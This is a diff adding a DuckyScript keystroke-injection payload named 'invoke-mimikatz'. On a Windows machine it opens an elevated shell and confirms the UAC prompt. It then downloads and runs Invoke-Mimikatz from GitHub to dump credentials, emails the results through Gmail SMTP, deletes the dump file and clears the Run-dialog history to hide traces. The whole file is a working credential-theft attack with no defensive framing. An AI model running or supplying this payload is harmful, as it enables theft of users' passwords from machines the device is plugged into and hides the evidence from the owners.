@@ -1,0 +1,59 @@
+REM --> invoke-mimikatz
+REM --> AUTHOR Blackbeard1st
+
+REM --> Wait on Device Interface
+DELAY 1000
+
+REM --> Open cmd as Admin
+GUI r
+DELAY 500
+
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 1000
+
+REM --> Confirm Admin
+ALT j
+DELAY 500
+
+STRING powershell
+ENTER
+DELAY 100
+
+STRING powershell "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/7efb7eeaabeb3daf916ead7856bb621bbca331f4/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds">credz.lst
+ENTER
+DELAY 100
+
+REM --> Send Output per E-mail
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('yourmail@gmail.com', 'yourpassword')
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'yourmail@gmail.com'
+ENTER
+STRING $ReportEmail.To.Add('yourmail@gmail.com')
+ENTER
+STRING $ReportEmail.Subject = 'my_credz_now'
+ENTER
+STRING $ReportEmail.Body = (Get-Content credz.lst | out-string)
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 3000
+STRING rm credz.lst
+ENTER
+
+REM --> Clear Registry
+STRING powershell REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
+ENTER
+DELAY 100
+STRING exit
+ENTER
+STRING exit
+ENTER
